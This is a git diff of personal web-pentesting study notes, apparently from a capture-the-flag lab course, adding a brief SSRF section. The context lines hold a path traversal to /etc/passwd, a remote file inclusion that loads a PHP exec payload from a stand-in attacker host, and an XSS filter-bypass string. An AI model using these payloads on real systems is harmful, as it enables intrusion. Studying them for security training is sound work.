@@ -102,6 +102,13 @@ Warning: include(languages/../../../../../etc/passwd.php): failed to open stream
 - prepare payload: cmd.txt: ``` <?php print exec('hostname');?> ```
 - lead victim server to execute it: http://webapp.htm/get.php?file=http://attacker.thm/cmd.txt
 
+## SSRF
+- server side request forgery
+- 2 types: regular, blind.
+- ![image](https://user-images.githubusercontent.com/91292763/147397891-1b4af01a-9f39-4b36-bd33-05bc21b2313e.png)
+
+
+
 ## Burp Suite Basic
 **Extensions**
 - java, jython, jRuby
@@ -198,5 +205,4 @@ email=<scripttt>alert("Succ3ssful%2bXSS")</scripttt>&content=hack+test
 
 **Write extender:**
 - https://portswigger.net/burp/extender/writing-your-first-burp-suite-extension
-
 
